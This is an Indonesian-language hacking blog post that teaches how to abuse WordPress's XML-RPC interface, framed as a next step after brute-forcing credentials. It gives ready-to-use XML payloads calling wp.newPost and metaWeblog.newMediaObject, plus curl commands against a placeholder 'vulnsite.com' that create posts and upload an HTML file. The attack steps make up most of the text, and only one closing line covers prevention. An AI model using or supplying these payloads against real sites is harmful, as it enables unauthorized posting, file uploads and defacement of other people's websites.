---
layout: post
title: "Exploiting XML-RPC API pada WordPress"
tags: tutorial, exploit, hacking
category: exploit
description: Vulnerability pada XML-RPC bukan hanya BruteForce saja...
comments: true
fullview: false
---
<!-- excerpt-start -->Vulnerability pada XMLRPC / tahap setelah BruteForce / alternatif jika gagal login ke /wp-admin/ (403/404/500)


1. Add Post (Menambahkan Postingan)
Menambahkan Postingan Baru Dengan POST XMLRPC:

Buka terminal linux (kali/ubuntu/termux/dll..)

Masukan command: nano addpost.xml

Lalu isikan dengan exploit berikut: 



<textarea style="background-color:black;color:lime;" rows="10" cols="45" readonly>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;methodCall&gt;
&lt;methodName&gt;wp.newPost&lt;/methodName&gt; &lt;params&gt;
        &lt;param&gt;&lt;value&gt;parameter&lt;/value&gt;&lt;/param&gt;
        &lt;param&gt;&lt;value&gt;vulnuser&lt;/value&gt;&lt;/param&gt;
        &lt;param&gt;&lt;value&gt;vulnuserpassword&lt;/value&gt;&lt;/param&gt;
        &lt;param&gt;&lt;struct&gt;
                &lt;member&gt;&lt;name&gt;post_title&lt;/name&gt;&lt;value&gt;Exploit To Add Post with XML-RPC&lt;/value&gt;&lt;/member&gt;
                &lt;member&gt;&lt;name&gt;post_content&lt;/name&gt;&lt;value&gt;Seems Like The Site Was Vulnerable!&lt;/value&gt;&lt;/member&gt;
                &lt;member&gt;&lt;name&gt;post_excerpt&lt;/name&gt;&lt;value&gt;excerpt&lt;/value&gt;&lt;/member&gt;
        &lt;/struct&gt;&lt;/param&gt; &lt;/params&gt;</textarea>
 Saatnya mengexploit!

Masukan command: 

curl http://vulnsite.com/xmlrpc.php --data @addpost.xml

Jika sukses akan tampil seperti ini:



Angka 6 adalah id postnya

Cara melihat postingannya dengan menambahkan ?p=idpostingan 

Contoh: http://vulnsite.com/?p=6



Post Sukses Dibuat.



 Add Media/File (Menambahkan Media/File)


Menambahkan Media atau File Baru Dengan POST XMLRPC:

Buka terminal linux (kali/ubuntu/termux/dll..)

Masukan command: nano addfile.xml

Lalu isikan dengan exploit berikut: 



<textarea style="background-color:black;color:lime;" rows="10" cols="45" readonly>&lt;?xml version="1.0"?&gt; &lt;methodCall&gt;
&lt;methodName&gt;metaWeblog.newMediaObject&lt;/methodName&gt; &lt;params&gt;
        &lt;param&gt;&lt;value&gt;parameter&lt;/value&gt;&lt;/param&gt;
        &lt;param&gt;&lt;value&gt;vulnuser&lt;/value&gt;&lt;/param&gt;
        &lt;param&gt;&lt;value&gt;vulnuserpassword&lt;/value&gt;&lt;/param&gt;
        &lt;param&gt;&lt;struct&gt;
                &lt;member&gt;&lt;name&gt;name&lt;/name&gt;&lt;value&gt;touched.html&lt;/value&gt;&lt;/member&gt;
                &lt;member&gt;&lt;name&gt;type&lt;/name&gt;&lt;value&gt;text/plain&lt;/value&gt;&lt;/member&gt;
                &lt;member&gt;&lt;name&gt;bits&lt;/name&gt;&lt;value&gt;
                &lt;![CDATA[&lt;h1&gt;&lt;center&gt;File Uploaded Success&lt;br/&gt;XML-RPC add file exploit&lt;/center&gt;&lt;/h1&gt;]]&gt;
&lt;/value&gt;&lt;/member&gt;
        &lt;/struct&gt;&lt;/param&gt; &lt;/params&gt;
&lt;/methodCall&gt;</textarea>


Exploit!

Masukan command: 

curl http://vulnsite.com/xmlrpc.php --data @addfile.xml

Jika sukses akan tampil seperti ini:



File sukses disimpan sesuai dengan nama yg telah ditentukan, di sini saya namakan filenya touched.html

Cara melihat hasil file yg tersimpan:

http://vulnsite.com/wp-content/uploads/2021(tahun saat upload)/05(bulan saat upload/namafile.html

Mari kita cek!:



File sukses terupload!



Cara mencegah exploit ini adalah dengan menginstall plugin bernama "Disable XML-RPC" lalu aktifkan, dan xmlrpc akan aman.



Sekian dari saya, semoga berguna dan bermanfaat!



